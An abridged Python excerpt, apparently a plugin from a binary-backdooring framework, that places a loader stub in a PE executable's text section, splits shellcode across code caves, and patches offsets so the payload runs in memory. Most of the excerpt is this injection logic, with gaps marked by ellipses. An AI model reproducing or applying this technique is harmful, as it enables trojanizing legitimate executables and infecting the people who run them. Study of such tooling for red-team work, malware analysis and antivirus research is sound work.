...
class text_loader_payload_splitting:

    def __init__(self, BDF=None):
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = """text_loader_payload_splitting"""
        self.description = """Places a stub in the text section, finds one code cave, and loads payload in memory"""
        ...
        self.loader_distance_from_payload_offset = {}
    ...
    def main(self):
        ...
        for item in self.BDF.pe_object['allshells']:
            tmp_payload_len += len(item)

        tmp_payload_len += len(self.BDF.pe_object['resumeExe'])

        self.equal_cave_length = math.ceil(tmp_payload_len/self.number_of_caves)
        ...
        # Place to start the loop for cave loading... just need to find the cave
        for i in range(0, self.number_of_caves):
            ...
            self.loader_distance_from_payload_offset[i] = len(self.loader)
        ...
        for i in range(0, self.number_of_caves):
            loader_tmp_front = self.BDF.pe_object['loader_stub'][:self.loader_distance_from_payload_offset[i]]
            loader_tmp_back = self.BDF.pe_object['loader_stub'][self.loader_distance_from_payload_offset[i] + len(self.distance_from_payload):]

            # THe number 7 is the amount of bytes at the end... and we must remove them.            
            self.BDF.pe_object['loader_stub'] = loader_tmp_front + struct.pack("<Q", self.BDF.pe_object['CavesPicked'][i][6] + 
                                                                               len(loader_tmp_back) -7) + loader_tmp_back
    ...
    def get_patch_instr(self):
        ...
        tmp_payload = self.BDF.pe_object['allshells'][0] + self.BDF.pe_object['resumeExe']

        self.BDF.pe_object['allshells'] = ()

        for i in range(0, self.number_of_caves):

            self.BDF.pe_object['allshells'] += (tmp_payload[i*self.equal_cave_length:(i+1)*self.equal_cave_length], )
